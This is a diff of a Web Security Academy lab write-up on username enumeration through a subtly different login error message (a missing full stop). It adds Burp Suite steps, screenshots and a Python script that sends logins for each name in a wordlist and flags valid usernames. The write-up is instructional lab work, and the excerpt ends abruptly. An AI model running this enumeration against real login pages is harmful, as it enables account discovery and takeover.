@@ -5,13 +5,17 @@ then we can see somthing specific in the error massege. this is a full stop at t
 
 <img width="1696" height="758" alt="image" src="https://github.com/user-attachments/assets/3e37b6eb-7824-48a2-b787-bccbfc16c907" />
 
-run `python ex.py`
+We captured the login request and sent it with dummy credentials in burpsuit
+
+<img width="921" height="880" alt="image" src="https://github.com/user-attachments/assets/e03e31f2-e783-4e9e-b0e9-c0eb0425af04" />
+
+we wrote python script to idintify valid username. python script to check different response like what are the not fullstop response
 
 ```import requests
 from pathlib import Path
  
 TARGET_URL = "https://0ac800df0392f42b810de86700cb0074.web-security-academy.net/login"
-WORDLIST = "users.txt"
+WORDLIST = "usernames.txt"
 PASSWORD = "password123"
 FAIL_SIG = "Invalid username or password."
  
@@ -33,9 +37,19 @@ for username in wordlist_path.read_text().splitlines():
             print(f"[+] Possible valid username: {username}")
     except requests.RequestException as e:
         print(f"[!] Error testing username '{username}': {e}")
-        ```
+```
 
-       
+then we open  linux terminal type nano burpsuit_attack.py and save the python script. now  we use `python3 burpsuit_attack.py`  for run this code. finaly we can see valid username  under screeanshot
+
+<img width="856" height="185" alt="image" src="https://github.com/user-attachments/assets/04b326b1-3de7-4618-8787-df231d6c3f04" />
+
+We observed the missing dot in the response for the valid username:
+
+
+
+
+
+
 
 
 
